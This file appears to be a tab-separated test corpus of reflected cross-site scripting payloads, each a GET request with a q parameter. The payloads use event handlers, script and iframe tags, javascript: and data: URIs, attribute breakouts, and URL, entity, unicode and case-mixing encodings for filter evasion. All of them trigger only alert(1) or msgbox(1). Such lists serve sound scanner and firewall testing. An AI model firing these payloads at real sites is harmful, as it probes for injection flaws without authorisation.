+XSS	GET	/	q=<a/onanimationstart=alert(1)>				
+XSS	GET	/	q=<a src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<a onpointerover=alert(1)>				
+XSS	GET	/	q=<a/onpointerover=alert(1)>				
+XSS	GET	/	q=<a src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<a onwheel=alert(1)>				
+XSS	GET	/	q=<a/onwheel=alert(1)>				
+XSS	GET	/	q=<a src=x onwheel=alert(1)>				
+XSS	GET	/	q=<div onerror=alert(1)>				
+XSS	GET	/	q=<div/onerror=alert(1)>				
+XSS	GET	/	q=<div src=x onerror=alert(1)>				
+XSS	GET	/	q=<div onload=alert(1)>				
+XSS	GET	/	q=<div/onload=alert(1)>				
+XSS	GET	/	q=<div src=x onload=alert(1)>				
+XSS	GET	/	q=<div onfocus=alert(1)>				
+XSS	GET	/	q=<div/onfocus=alert(1)>				
+XSS	GET	/	q=<div src=x onfocus=alert(1)>				
+XSS	GET	/	q=<div ontoggle=alert(1)>				
+XSS	GET	/	q=<div/ontoggle=alert(1)>				
+XSS	GET	/	q=<div src=x ontoggle=alert(1)>				
+XSS	GET	/	q=<div onmouseover=alert(1)>				
+XSS	GET	/	q=<div/onmouseover=alert(1)>				
+XSS	GET	/	q=<div src=x onmouseover=alert(1)>				
+XSS	GET	/	q=<div onclick=alert(1)>				
+XSS	GET	/	q=<div/onclick=alert(1)>				
+XSS	GET	/	q=<div src=x onclick=alert(1)>				
+XSS	GET	/	q=<div onstart=alert(1)>				
+XSS	GET	/	q=<div/onstart=alert(1)>				
+XSS	GET	/	q=<div src=x onstart=alert(1)>				
+XSS	GET	/	q=<div onbegin=alert(1)>				
+XSS	GET	/	q=<div/onbegin=alert(1)>				
+XSS	GET	/	q=<div src=x onbegin=alert(1)>				
+XSS	GET	/	q=<div onanimationstart=alert(1)>				
+XSS	GET	/	q=<div/onanimationstart=alert(1)>				
+XSS	GET	/	q=<div src=x onanimationstart=alert(1)>				
+XSS	GET	/	q=<div onpointerover=alert(1)>				
+XSS	GET	/	q=<div/onpointerover=alert(1)>				
+XSS	GET	/	q=<div src=x onpointerover=alert(1)>				
+XSS	GET	/	q=<div onwheel=alert(1)>				
+XSS	GET	/	q=<div/onwheel=alert(1)>				
+XSS	GET	/	q=<div src=x onwheel=alert(1)>				
+XSS	GET	/	q=%3Cscript%3Ealert%281%29%3C/script%3E				
+XSS	GET	/	q=%253Cscript%253Ealert%25281%2529%253C/script%253E				
+XSS	GET	/	q=&#60;script&#62;alert(1)&#60;/script&#62;				
+XSS	GET	/	q=\u003cscript\u003ealert(1)\u003c/script\u003e				
+XSS	GET	/	q=＜script＞alert(1)＜/script＞				
+XSS	GET	/	q=<SCRIPT>ALERT(1)</SCRIPT>				
+XSS	GET	/	q=<ScRiPt>alert(1)</ScRiPt>				
+XSS	GET	/	q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E				
+XSS	GET	/	q=%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E				
+XSS	GET	/	q=&lt;img src=x onerror=alert(1)&gt;				
+XSS	GET	/	q=&#x3c;img src=x onerror=alert(1)&#x3e;				
+XSS	GET	/	q=&#60;img src=x onerror=alert(1)&#62;				
+XSS	GET	/	q=\u003cimg src=x onerror=alert(1)\u003e				
+XSS	GET	/	q=＜img src=x onerror=alert(1)＞				
+XSS	GET	/	q=<IMG SRC=X ONERROR=ALERT(1)>				
+XSS	GET	/	q=%253Csvg%2520onload%253Dalert%25281%2529%253E				
+XSS	GET	/	q=&lt;svg onload=alert(1)&gt;				
+XSS	GET	/	q=&#x3c;svg onload=alert(1)&#x3e;				
+XSS	GET	/	q=&#60;svg onload=alert(1)&#62;				
+XSS	GET	/	q=\u003csvg onload=alert(1)\u003e				
+XSS	GET	/	q=＜svg onload=alert(1)＞				
+XSS	GET	/	q=<SVG ONLOAD=ALERT(1)>				
+XSS	GET	/	q=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E				
+XSS	GET	/	q=%253Ciframe%2520src%253Djavascript%253Aalert%25281%2529%253E				
+XSS	GET	/	q=&lt;iframe src=javascript:alert(1)&gt;				
+XSS	GET	/	q=&#x3c;iframe src=javascript:alert(1)&#x3e;				
+XSS	GET	/	q=&#60;iframe src=javascript:alert(1)&#62;				
+XSS	GET	/	q=\u003ciframe src=javascript:alert(1)\u003e				
+XSS	GET	/	q=＜iframe src=javascript:alert(1)＞				
+XSS	GET	/	q=<IFRAME SRC=JAVASCRIPT:ALERT(1)>				
+XSS	GET	/	q=<iframe src=javaScRiPt:alert(1)>				
+XSS	GET	/	q=%3Cbody%20onload%3Dalert%281%29%3E				
+XSS	GET	/	q=%253Cbody%2520onload%253Dalert%25281%2529%253E				
+XSS	GET	/	q=&lt;body onload=alert(1)&gt;				
+XSS	GET	/	q=&#x3c;body onload=alert(1)&#x3e;				
+XSS	GET	/	q=&#60;body onload=alert(1)&#62;				
+XSS	GET	/	q=\u003cbody onload=alert(1)\u003e				
+XSS	GET	/	q=＜body onload=alert(1)＞				
+XSS	GET	/	q=<BODY ONLOAD=ALERT(1)>				
+XSS	GET	/	q=javascript%3Aalert%281%29				
+XSS	GET	/	q=<a href="javascript:alert(1)">x</a>				
+XSS	GET	/	q=<iframe src="javascript:alert(1)">				
+XSS	GET	/	q=javascript%3Aalert%281%29//				
+XSS	GET	/	q=<a href="javascript:alert(1)//">x</a>				
+XSS	GET	/	q=<iframe src="javascript:alert(1)//">				
+XSS	GET	/	q=data%3Atext/html%2C%3Cscript%3Ealert%281%29%3C/script%3E				
+XSS	GET	/	q=<a href="data:text/html,<script>alert(1)</script>">x</a>				
+XSS	GET	/	q=<iframe src="data:text/html,<script>alert(1)</script>">				
+XSS	GET	/	q=vbscript%3Amsgbox%281%29				
+XSS	GET	/	q=<a href="vbscript:msgbox(1)">x</a>				
+XSS	GET	/	q=<iframe src="vbscript:msgbox(1)">				
+XSS	GET	/	q=livescript%3Aalert%281%29				
+XSS	GET	/	q=<a href="livescript:alert(1)">x</a>				
+XSS	GET	/	q=<iframe src="livescript:alert(1)">				
+XSS	GET	/	q=mocha%3Aalert%281%29				
+XSS	GET	/	q=<a href="mocha:alert(1)">x</a>				
+XSS	GET	/	q=<iframe src="mocha:alert(1)">				
+XSS	GET	/	q=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E				
+XSS	GET	/	q=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E				
+XSS	GET	/	q='><img src=x onerror=alert(1)>				
+XSS	GET	/	q=%22%20onmouseover%3Dalert%281%29%20x%3D%22				
+XSS	GET	/	q=" onmouseover=alert(1) x="				
+XSS	GET	/	q=%27%20onfocus%3Dalert%281%29%20autofocus%3D%27				
+XSS	GET	/	q=' onfocus=alert(1) autofocus='				
+XSS	GET	/	q=document.write%28%27%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%27%29				
+XSS	GET	/	q=eval%28%27alert%281%29%27%29				
+XSS	GET	/	q=innerHTML%3D%27%3Csvg%20onload%3Dalert%281%29%3E%27				
+XSS	GET	/	q=location%3D%27javascript%3Aalert%281%29%27				
